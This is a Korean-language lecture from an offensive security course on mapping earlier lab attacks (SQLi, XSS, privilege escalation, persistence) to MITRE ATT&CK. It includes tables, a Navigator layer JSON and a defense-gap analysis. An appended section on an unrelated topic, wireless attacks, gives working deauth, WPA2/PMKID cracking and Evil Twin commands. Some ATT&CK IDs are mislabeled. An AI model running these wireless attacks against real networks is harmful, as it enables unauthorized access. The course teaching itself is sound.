# Week 13: MITRE ATT&CK 종합 매핑

## 학습 목표
- ATT&CK의 3계층(전술/기법/하위기법) 구조와 ID 체계(TAxxxx / Txxxx / Txxxx.xxx)를 이해한다
- Cyber Kill Chain 7단계와 ATT&CK 14전술의 매핑을 설명한다
- 본 과정 Week 02~12에서 수행한 모든 공격을 ATT&CK에 매핑한 표를 작성한다
- ATT&CK Navigator로 "커버된 기법"을 시각화한 Layer JSON을 만든다
- Bastion에게 자연어로 "지난 실습들을 ATT&CK으로 매핑해줘" 를 요청한다
- 방어 커버리지(어느 전술에 탐지 룰이 있는가)를 평가한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | Bastion :8003 |
| web | 10.20.30.80 | 과거 공격 표적 (이번 주는 재실행 없음) |
| 학생 브라우저 | - | ATT&CK Navigator 웹 GUI |

## 강의 시간 배분 (3시간)

| 시간 | 내용 |
|------|------|
| 0:00-0:30 | ATT&CK 구조·ID 체계 (Part 1) |
| 0:30-1:00 | 14 전술 개요 + Kill Chain 비교 (Part 2~3) |
| 1:00-1:10 | 휴식 |
| 1:10-2:00 | Week 02~12 전체 매핑 (Part 4) |
| 2:00-2:30 | ATT&CK Navigator Layer 작성 (Part 5) |
| 2:30-2:40 | 휴식 |
| 2:40-3:10 | 방어 커버리지 평가 (Part 6) |
| 3:10-3:30 | Bastion 자동 매핑 (Part 7) |
| 3:30-3:40 | 과제 |

---

# Part 1: ATT&CK 구조

## 1.1 ATT&CK이란

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) — 실제 관찰된 공격자 행동을 체계적으로 분류한 공개 지식 기반.

- **URL:** https://attack.mitre.org
- **업데이트:** 주기적 (보통 6개월 단위)
- **도메인:** Enterprise / Mobile / ICS (본 과정은 Enterprise)

## 1.2 3계층 구조

```
전술 (Tactic)       = "왜?" (공격자의 목적)
  └ 기법 (Technique)   = "무엇을?" (구체적 방법)
      └ 하위기법 (Sub-technique) = "어떻게?" (변형)
          └ 절차 (Procedure)         = "누가·어떤 도구로?"
```

**예시:**
```
TA0001 Initial Access (초기 접근)
  └ T1190 Exploit Public-Facing Application
      └ 하위기법: 없음
          └ 절차: JuiceShop `' OR 1=1--` SQL Injection (Week 04)
```

## 1.3 ID 체계

| 접두 | 의미 | 예 |
|------|------|-----|
| TAxxxx | Tactic | TA0001 Initial Access |
| Txxxx | Technique | T1190 Exploit Public-Facing App |
| Txxxx.xxx | Sub-technique | T1059.004 Unix Shell |
| Gxxxx | Group (APT) | G0016 APT29 |
| Sxxxx | Software | S0002 Mimikatz |
| Mxxxx | Mitigation | M1042 Disable or Remove Feature |

---

# Part 2: 14 전술 (Enterprise)

| # | ID | 전술명 | 본 과정 실습 |
|---|-----|--------|---------------|
| 1 | TA0043 | Reconnaissance (정찰) | Week 02 |
| 2 | TA0042 | Resource Development | — (인프라 제공됨) |
| 3 | TA0001 | Initial Access | Week 04 (SQLi), Week 06 (인증 우회) |
| 4 | TA0002 | Execution | Week 05 (XSS JS 실행), Week 07 (업로드) |
| 5 | TA0003 | Persistence | Week 12 |
| 6 | TA0004 | Privilege Escalation | Week 11 |
| 7 | TA0005 | Defense Evasion | Week 10, Week 12 |
| 8 | TA0006 | Credential Access | Week 04 (해시 추출), Week 06 (보안 질문) |
| 9 | TA0007 | Discovery | Week 02, Week 09 |
| 10 | TA0008 | Lateral Movement | — (단일 타깃) |
| 11 | TA0009 | Collection | Week 07 (/ftp 파일), Week 04 (DB 덤프) |
| 12 | TA0011 | Command and Control | Week 10 (터널링 개념) |
| 13 | TA0010 | Exfiltration | — (실제 외부 유출 없음) |
| 14 | TA0040 | Impact | — (파괴적 공격 없음) |

**본 과정 미실습 전술:** TA0042, TA0008, TA0010, TA0040. 운영 원칙상 교육 환경에서 다루지 않음. 실제 APT는 14전술 전부 사용.

---

# Part 3: Cyber Kill Chain vs ATT&CK

## 3.1 Lockheed Martin Kill Chain (7단계)

```
1. Reconnaissance → 2. Weaponization → 3. Delivery
  → 4. Exploitation → 5. Installation → 6. C2
  → 7. Actions on Objectives
```

**한계:** 7단계 선형 구조. 실제 APT는 반복·병렬 전환 빈번. C2 중 다시 정찰 등.

## 3.2 매핑 표

| Kill Chain | ATT&CK Tactic |
|------------|---------------|
| Reconnaissance | TA0043 Reconnaissance |
| Weaponization | TA0042 Resource Development |
| Delivery | TA0001 Initial Access |
| Exploitation | TA0002 Execution |
| Installation | TA0003 Persistence, TA0004 Priv Esc |
| C2 | TA0011 Command and Control |
| Actions on Objectives | TA0009 Collection, TA0010 Exfiltration, TA0040 Impact |

## 3.3 ATT&CK의 강점

- **병렬·반복 허용** — 14 전술은 시점이 아닌 **목적**
- **기법 수준 세밀도** — 600+ Technique, 1800+ Sub-technique
- **공개 APT 그룹·멀웨어 매핑** — G0016 APT29, S0002 Mimikatz 등
- **방어 관점 통합** — 각 기법에 Detection·Mitigation 연동

---

# Part 4: 본 과정 공격의 ATT&CK 매핑

## 4.1 전체 매트릭스 (Week 02~12)

| 주차 | 공격 | ATT&CK ID | 전술 |
|------|------|-----------|------|
| **Week 02** | nmap 포트 스캔 | T1595.002 Vulnerability Scanning | Reconnaissance |
| Week 02 | nmap -sV 서비스 탐지 | T1046 Network Service Discovery | Discovery |
| Week 02 | robots.txt·/ftp 탐색 | T1595.003 Wordlist Scanning | Reconnaissance |
| Week 02 | HTTP 헤더 수집 | T1592.004 Client Configurations | Reconnaissance |
| **Week 03** | JWT 디코딩 | T1552.005 Cloud Instance Metadata (유사 개념) | Credential Access |
| Week 03 | REST API 엔드포인트 열거 | T1595 Active Scanning | Reconnaissance |
| **Week 04** | SQL Injection `' OR 1=1--` | T1190 Exploit Public-Facing App | Initial Access |
| Week 04 | 관리자 계정 탈취 | T1078 Valid Accounts | Initial Access |
| Week 04 | UNION으로 DB 덤프 | T1005 Data from Local System | Collection |
| Week 04 | MD5 해시 획득 | T1003.008 /etc/passwd and /etc/shadow (유사) | Credential Access |
| **Week 05** | DOM/Reflected/Stored XSS | T1059.007 JavaScript | Execution |
| Week 05 | localStorage JWT 탈취 | T1539 Steal Web Session Cookie | Credential Access |
| **Week 06** | 보안 질문 답변 brute | T1110.003 Password Spraying | Credential Access |
| Week 06 | JWT alg=none 위조 | T1550.001 Application Access Token | Defense Evasion |
| Week 06 | IDOR (basket/1) | T1552 Unsecured Credentials (접근제어 부재) | Credential Access |
| Week 06 | 수직 권한상승 (customer→admin 기능) | T1078 Valid Accounts | Initial Access |
| **Week 07** | SSRF 내부 IP 스캔 | T1595.002 + T1210 Exploit Remote Services | Reconnaissance |
| Week 07 | `/ftp` 경로 탐색 + %2500 | T1083 File and Directory Discovery | Discovery |
| Week 07 | package.json.bak 수집 | T1005 Data from Local System | Collection |
| Week 07 | 파일 업로드 검증 우회 | T1608.001 Upload Malware | Resource Development |
| **Week 09** | tcpdump 패킷 캡처 | T1040 Network Sniffing | Credential Access |
| Week 09 | ARP 스푸핑 (개념) | T1557.002 ARP Cache Poisoning | Credential Access |
| **Week 10** | URL 인코딩 IPS 우회 | T1027 Obfuscated Files or Information | Defense Evasion |
| Week 10 | 공백 대체 (/**/) | T1027 | Defense Evasion |
| Week 10 | sqlmap --tamper | T1027 | Defense Evasion |
| Week 10 | ICMP 터널링 (개념) | T1572 Protocol Tunneling | Command and Control |
| Week 10 | HTTP C2 비콘 (개념) | T1071.001 Web Protocols | Command and Control |
| Week 10 | nmap -T1 -f -D | T1562.004 Disable or Modify System Firewall (회피) | Defense Evasion |
| **Week 11** | SUID 바이너리 악용 | T1548.001 Setuid and Setgid | Privilege Escalation |
| Week 11 | sudo NOPASSWD 악용 | T1548.003 Sudo and Sudo Caching | Privilege Escalation |
| Week 11 | cron 악용 (PrivEsc) | T1053.003 Cron | Privilege Escalation |
| Week 11 | PATH 하이재킹 | T1574.007 PATH Interception | Privilege Escalation |
| Week 11 | 커널 익스플로잇 (개념) | T1068 Exploitation for PrivEsc | Privilege Escalation |
| **Week 12** | SSH 키 인젝션 | T1098.004 SSH Authorized Keys | Persistence |
| Week 12 | cron 백도어 | T1053.003 Cron | Persistence |
| Week 12 | systemd 서비스 백도어 | T1543.002 Systemd Service | Persistence |
| Week 12 | .bashrc 수정 | T1546.004 Unix Shell Configuration Modification | Persistence |
| Week 12 | 새 계정 생성 | T1136.001 Local Account | Persistence |
| Week 12 | 히스토리 비활성화 | T1070.003 Clear Command History | Defense Evasion |
| Week 12 | 로그 삭제 | T1070.002 Clear Linux or Mac System Logs | Defense Evasion |
| Week 12 | 타임스탬프 조작 | T1070.006 Timestomp | Defense Evasion |
| Week 12 | /dev/shm 메모리 실행 | T1059.004 Unix Shell | Execution |

## 4.2 전술별 커버리지 히트맵

```
Reconnaissance       ████████░░ 4 기법 (T1595.002/003, T1592.004, T1046)
Initial Access       ████████░░ 3 기법 (T1190, T1078 x2)
Execution            ██████░░░░ 2 기법 (T1059.007, T1059.004)
Persistence          ████████░░ 5 기법 (T1098.004, T1053.003, T1543.002, T1546.004, T1136.001)
Privilege Escalation ████████░░ 5 기법 (T1548.001, T1548.003, T1053.003, T1574.007, T1068)
Defense Evasion      ████████░░ 5 기법 (T1027, T1562.004, T1070.002/003/006, T1550.001)
Credential Access    ████████░░ 5 기법 (T1040, T1557.002, T1552, T1539, T1110.003)
Discovery            ████░░░░░░ 2 기법 (T1083, T1046)
Collection           ████░░░░░░ 2 기법 (T1005, T1083)
Command and Control  ████░░░░░░ 2 기법 (T1572, T1071.001)
Lateral Movement     ░░░░░░░░░░ 0 (단일 타깃)
Exfiltration         ░░░░░░░░░░ 0 (시뮬만)
Impact               ░░░░░░░░░░ 0 (비파괴적)
Resource Development ██░░░░░░░░ 1 (T1608.001)
```

**결론:** 본 과정은 **9 전술 × 약 35 기법**을 다룸. 실무 APT는 14 전술 전부 활용하므로, **심화 과정**(Course 11~20)에서 Lateral Movement·Exfiltration·Impact 등 추가 학습.

---

# Part 5: ATT&CK Navigator Layer 작성

## 5.1 Navigator 사용법

1. 브라우저에서 https://mitre-attack.github.io/attack-navigator/ 접속
2. **Create New Layer** → **Enterprise ATT&CK** 선택
3. 사용한 기법 셀을 클릭 → 색·코멘트 입력
4. **File → Export as JSON** → 공유 가능

## 5.2 Layer JSON 구조 (예시)

```json
{
  "name": "CCC Course1 Attack — Week 02~12",
  "versions": {
    "attack": "14",
    "navigator": "4.9",
    "layer": "4.5"
  },
  "domain": "enterprise-attack",
  "description": "CCC 모의해킹 과정 Week 02~12의 공격 기법 매핑",
  "techniques": [
    {
      "techniqueID": "T1190",
      "score": 1,
      "color": "#ff6666",
      "comment": "Week 04: JuiceShop SQLi ' OR 1=1--"
    },
    {
      "techniqueID": "T1059.007",
      "score": 1,
      "color": "#ff9933",
      "comment": "Week 05: DOM/Reflected/Stored XSS"
    },
    {
      "techniqueID": "T1548.003",
      "score": 1,
      "color": "#ff6666",
      "comment": "Week 11: sudo NOPASSWD:ALL 악용"
    }
  ],
  "gradient": {
    "colors": ["#ff6666", "#ff9933", "#ffff99"],
    "minValue": 0,
    "maxValue": 2
  }
}
```

## 5.3 과제용 템플릿

Part 4의 전체 매트릭스에서 35개 기법을 복사해 Layer JSON 생성 → 과제 제출.

---

# Part 6: 방어 커버리지 평가

## 6.1 공격-방어 매핑

| 공격 기법 | 탐지 (Detection) | 완화 (Mitigation) |
|-----------|-----------------|-------------------|
| T1190 SQLi | WAF 로그, Suricata HTTP 룰 | M1050 Exploit Protection, 매개변수화 쿼리 |
| T1098.004 SSH keys | Wazuh FIM (`authorized_keys`) | M1032 Multi-factor Auth |
| T1548.003 Sudo | auditd, Wazuh sudo 룰 | M1026 Privileged Account Mgmt |
| T1053.003 Cron | `crontab -l` 모니터링, FIM | M1022 Restrict File and Directory Permissions |
| T1070.002 Log Clear | journal 백업, 원격 syslog | M1029 Remote Data Storage |

## 6.2 현재 실습 환경의 탐지 커버리지

우리 인프라(secu + siem)가 **탐지하는** 것:

✓ Suricata — T1190, T1046, T1027, T1557.002
✓ Wazuh FIM — T1098.004, T1543.002, T1546.004
✓ Wazuh auth.log — T1078, T1110.003, T1548.003

**약한 부분:**
- T1072.006 Timestomp — ctime 변화 감시 필요 (기본 미구성)
- T1572 Protocol Tunneling — ICMP 페이로드 엔트로피 감시 필요
- T1539 Steal Web Session Cookie (localStorage) — 브라우저 단 감지 어려움

---

# Part 7: Bastion 자동 매핑

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "지난 11주 동안 /evidence에 기록된 작업들을 분석해서 MITRE ATT&CK 기법으로 매핑해줘. 각 기법ID, 전술, 사용된 Skill, 타임스탬프를 표로 정리하고, 본 과정에서 미실습된 전술 목록도 제시해줘."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

**결과 활용:** Bastion이 생성한 표를 Navigator Layer JSON 변환에 활용 → 과제 작성 시간 단축.

---

## 과제 (다음 주까지)

### 과제 1: 전체 매핑 표 (40점)
Part 4의 35개 기법을 **본인이 직접 실습한 증거**(스크린샷·evidence 로그)와 함께 표로 재작성.
- 실습 안 한 기법은 제외
- 각 기법에 1줄 증거 링크

### 과제 2: ATT&CK Navigator Layer (30점)
- Part 5 템플릿으로 Layer JSON 생성
- Navigator에서 렌더링한 스크린샷
- 색상 배정(빈도별/중요도별) 근거 설명

### 과제 3: 방어 커버리지 갭 분석 (20점)
- 현재 Suricata/Wazuh가 탐지 **못 하는** 기법 5개 선정
- 각 기법별 **탐지 룰 1개**씩 설계 (Suricata 또는 Wazuh)

### 과제 4: Bastion 자동 매핑 (10점)
- Part 7 자연어 요청 실행 결과 캡처
- Bastion 매핑 vs 본인 매핑 차이 비교

---

## 다음 주 예고

**Week 14: Bastion 자연어 자동 침투 테스트**

---

## 용어 해설 (이번 주 추가분)

| 용어 | 영문 | 설명 |
|------|------|------|
| **MITRE ATT&CK** | - | 공격자 TTP 공개 지식 기반 |
| **Tactic** | - | 공격 목적 (14개) |
| **Technique** | - | 구체적 방법 (600+) |
| **Sub-technique** | - | 기법의 변형 (1800+) |
| **Procedure** | - | 실제 절차 (그룹/멀웨어 사례) |
| **Cyber Kill Chain** | - | Lockheed Martin 7단계 공격 모델 |
| **ATT&CK Navigator** | - | 매트릭스 웹 시각화 도구 |
| **Layer JSON** | - | Navigator가 사용하는 매핑 파일 |
| **Heat map** | - | 기법 사용 빈도·심각도 색상 표시 |
| **APT Group (Gxxxx)** | - | ATT&CK이 추적하는 공격 그룹 |
| **Detection / Mitigation** | - | 각 기법의 탐지·완화 방안 |

---

## 📂 실습 참조 파일 가이드

### MITRE ATT&CK 공식 리소스 (이번 주 사용)

| 리소스 | URL | 용도 |
|--------|-----|------|
| ATT&CK Matrix | https://attack.mitre.org/matrices/enterprise/ | 전체 매트릭스 탐색 |
| Navigator | https://mitre-attack.github.io/attack-navigator/ | Layer 작성 |
| Technique 페이지 | `https://attack.mitre.org/techniques/Txxxx/` | 기법 상세 |
| STIX JSON | https://github.com/mitre/cti | 프로그래밍 접근 |

### Bastion API (이번 주 중심)

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 자동 매핑 요청 |
| GET | `/evidence?limit=N` | 과거 실습 이력 |

### 우리 실습 환경의 탐지 도구

| 도구 | 위치 | 담당 ATT&CK |
|------|------|-------------|
| Suricata | secu:/etc/suricata/ | T1190, T1046, T1027, T1557.002 (네트워크 계층) |
| Wazuh | siem:/var/ossec/ | FIM, auth, sudo (호스트 계층) |
| auditd (개별 호스트) | /etc/audit/ | 시스템 콜·파일 접근 (세밀한 탐지) |

---

> **참고:** 본 과정은 Enterprise 도메인만 다룸. ICS(산업제어)·Mobile 도메인은 Course 17(IoT), Course 18(자율시스템)에서 학습.

---

## 실제 사례 (WitFoo Precinct 6 — incident 1건의 14전술 ATT&CK 매핑 워크시트)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *MITRE ATT&CK 종합 매핑* — w02-w12 모든 공격을 ATT&CK 14전술 × 200+ 기법으로 매핑하는 통합 주차. dataset 의 incident `e5578610` 를 *학생 매핑 워크북* 으로 활용.

### Case 1: incident `e5578610-d2eb-11ee-...` 의 14전술 매핑 표

**원본 host 노드 (incidents.jsonl 발췌)**:

```json
{
  "id": "HOST-4476",
  "ip_address": "172.27.150.101",
  "internal": true,
  "managed": false,
  "suspicion_score": 0.71875,
  "sets": {
    "5": {"name": "Exploiting Target"},
    "1": {"name": "Exploiting Host"}
  },
  "products": {
    "6": {"name": "Precinct", "vendor_name": "WitFoo"},
    "17": {"name": "ASA Firewall", "vendor_name": "Cisco"}
  }
}
```

**14전술 워크시트 (학생이 본인 점검 결과로 채울 양식)**:

| TA-ID | 전술 (Tactic) | 본 incident 의 evidence | 본 과목 주차 |
|-------|--------------|------------------------|------------|
| TA0043 | Reconnaissance | dataset의 firewall_action 정찰 burst (앞선 w02) | w02 정찰 |
| TA0042 | Resource Development | (본 incident 직접 부재 — 추가 cycle 필요) | w03 |
| TA0001 | Initial Access | suspicion_score 0.71 의 first signal | w04~w07 |
| TA0002 | Execution | (cmd execution log 별도 추적) | w11 |
| TA0003 | Persistence | systemd_event 34K + cron 변경 | w12 |
| TA0004 | Privilege Escalation | 4672 + 4798/4799 enumeration | w11 |
| TA0005 | Defense Evasion | 4985 transaction rollback | w10 + w12 |
| TA0006 | Credential Access | 4624/4625 + 4776 NTLM | w06 |
| TA0007 | Discovery | 4798/4799 group enum | w11 |
| TA0008 | Lateral Movement | 5156 + 5140 share access | w09 |
| TA0009 | Collection | (file 4663 + 4690 handle dup) | w07 |
| TA0011 | Command and Control | dns_event + tls flow | w10 |
| **TA0010** | **Exfiltration** | mo_name="Data Theft" 125,772건, lifecycle="complete-mission" | w14 |
| TA0040 | Impact | (본 incident 의 complete-mission 단계) | — |

### Case 2: 본 incident 의 *수직 대응* — Cyber Kill Chain 7단계

| Kill Chain | ATT&CK Tactic 매핑 | 본 incident 증거 |
|------------|-------------------|-----------------|
| 1. Reconnaissance | TA0043 | suspicion_score 의 *upward 추세* 시작 시점 |
| 2. Weaponization | TA0042 | (직접 record 부재) |
| 3. Delivery | TA0001 (일부) | initial-compromise 라벨 (45,420건) |
| 4. Exploitation | TA0002 | execution log |
| 5. Installation | TA0003 | persistence event |
| 6. C2 | TA0011 | dns/tls flow |
| 7. Actions on Objectives | TA0040 + TA0010 | **complete-mission 라벨 (125,772건)** + Data Theft |

**해석 — 본 lecture 와의 매핑**

| ATT&CK 매핑 학습 항목 | 본 record 의 증거 |
|---------------------|------------------|
| **다층 매핑 (Tactic → Technique → Sub-technique)** | 본 incident 가 *Tactic 라벨* (lifecycle_stage) + *Technique 라벨* (mo_name) 동시 보유 — 학생 워크북도 동등 layer |
| **frameworks 조합** | host 가 csc/cmmc/iso27001/soc2 4-framework 매핑 동시 — 학생 답안에 동일 매핑 강제 |
| **multi-vendor evidence** | Precinct + Cisco ASA 두 vendor — 매핑 시 *evidence 출처* 명시 |
| **공격 단계의 누적** | 본 dataset 의 91.7% noise + 8.3% 공격 단계 → 매핑 워크북에 *모든 14전술 record 가 매번 발생하지 않는다* 명시 |

**학생 워크북 작성 권고**:
1. 본 incident 의 14전술 표를 *본인 점검 결과* 로 재작성 (모든 cell 채우기)
2. *증거 부재* cell 에는 "(record 부재 — 추가 수집 필요)" 명시 (정직성)
3. Kill Chain ↔ ATT&CK 매핑 표를 *시간순* 으로 정렬 → 공격의 *시간 흐름* 시각화



---

## 부록: 학습 OSS 도구 매트릭스 (Course1 Attack — Week 13 무선 네트워크)

| 기법 | lab step | 본문 도구 | OSS 도구 옵션 | 비고 |
|------|----------|----------|---------------|------|
| 무선 인터페이스 모니터 모드 | s1 | `airmon-ng start wlan0` | aircrack-ng suite / iw / airmon-ng | iwconfig 도 가능 |
| AP 스캔 | s2 | `airodump-ng wlan0mon` | airodump-ng / kismet / wifite -i | kismet GUI |
| Probe 요청 sniff | s3 | `airodump-ng -d` | airodump-ng / hcxdumptool / kismet | hcxdumptool 권장 |
| 4-way Handshake 캡처 | s4 | `airodump-ng -c <ch> --bssid <ap> -w cap` | airodump-ng / hcxdumptool | hcxdumptool = 새 패킷 형식 |
| Deauth 공격 | s5 | `aireplay-ng --deauth` | aireplay-ng / mdk4 / wifite | mdk4 다양 |
| WPA2 크래킹 | s6 | `aircrack-ng -w wordlist cap` | aircrack-ng / hashcat -m 22000 / john | hashcat GPU 권장 |
| WPS 공격 | s7 | `reaver / bully` | reaver / bully / wifite | WPS PIN brute |
| Evil Twin AP | s8 | `hostapd / airbase-ng` | hostapd-mana / airgeddon / WiFi-Pumpkin3 | airgeddon = all-in-one |
| Captive Portal 피싱 | s9 | `dnsmasq + apache` | airgeddon / WiFi-Pumpkin / fluxion | fluxion = 자동 |
| PMKID 공격 (clientless) | s10 | `hcxdumptool` | hcxdumptool + hashcat -m 16800 | client 없이 가능 |
| Karma (probe spoof) | s11 | `mana-toolkit` | hostapd-mana / WiFi-Pumpkin / KARMA | |
| Bluetooth recon | s12 | `bluetoothctl / hcitool` | bluetoothctl / blueranger / blue_hydra | |
| BLE 스캔 | s13 | `gatttool` | bettercap ble.recon / bluez-utils | bettercap 통합 |
| 보고 | s15 | text | wifite — auto report / aircrack 출력 | |

### 학생 환경 준비 (한 번만 실행, **무선 카드 + 모니터 모드 지원** 필요)

```bash
ssh ccc@192.168.0.112

sudo apt update && sudo apt install -y \
  aircrack-ng kismet wifite \
  reaver bully \
  hostapd dnsmasq \
  hcxdumptool hcxtools \
  mdk4 \
  bluez bluez-tools \
  hashcat john

# airgeddon — all-in-one (zsh)
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git ~/airgeddon

# WiFi-Pumpkin3 (rogue AP framework)
git clone https://github.com/P0cL4bs/wifipumpkin3.git ~/wifipumpkin3
cd ~/wifipumpkin3 && pip3 install -r requirements.txt

# fluxion — Evil Twin 자동
git clone https://github.com/FluxionNetwork/fluxion.git ~/fluxion

# 무선 카드 확인 (모니터 모드 지원)
iw list | grep -A 20 "Supported interface modes"
# "monitor" 가 있어야 함
```

### 핵심 시나리오

```bash
# 1) 모니터 모드
sudo airmon-ng check kill
sudo airmon-ng start wlan0          # → wlan0mon 생성

# 2) AP 발견 + 채널 확인
sudo airodump-ng wlan0mon

# 3) 특정 AP 의 Handshake 캡처
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/cap wlan0mon
# 다른 터미널에서 deauth (client 강제 재인증)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 4) 크래킹 (CPU)
aircrack-ng -w /usr/share/wordlists/rockyou.txt /tmp/cap-01.cap

# 5) 크래킹 (GPU — 빠름)
hcxpcapngtool -o /tmp/hash22000.hc22000 /tmp/cap-01.cap
hashcat -m 22000 -a 0 /tmp/hash22000.hc22000 /usr/share/wordlists/rockyou.txt

# 6) PMKID 공격 (clientless)
sudo hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --enable_status=15
# 짧은 시간 내 PMKID 캡처되면 22000 해시 변환
hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid.pcapng
hashcat -m 22000 /tmp/pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# 7) Evil Twin (airgeddon, 인터랙티브)
sudo bash ~/airgeddon/airgeddon.sh
# 메뉴 → 선택 인터페이스 → Evil Twin Attacks
```

학생은 본 13주차에서 **WPA2 크래킹 (handshake + GPU 해시)** + **PMKID 공격 (clientless)** + **Evil Twin (rogue AP)** 의 3 핵심 패턴을 도구로 익힌다.

> ⚠ **법적 경고**: 무선 공격은 본인 소유 또는 명시적 허가받은 AP 에만 허용. 공공 Wi-Fi/타인 AP 는 형사처벌 대상.
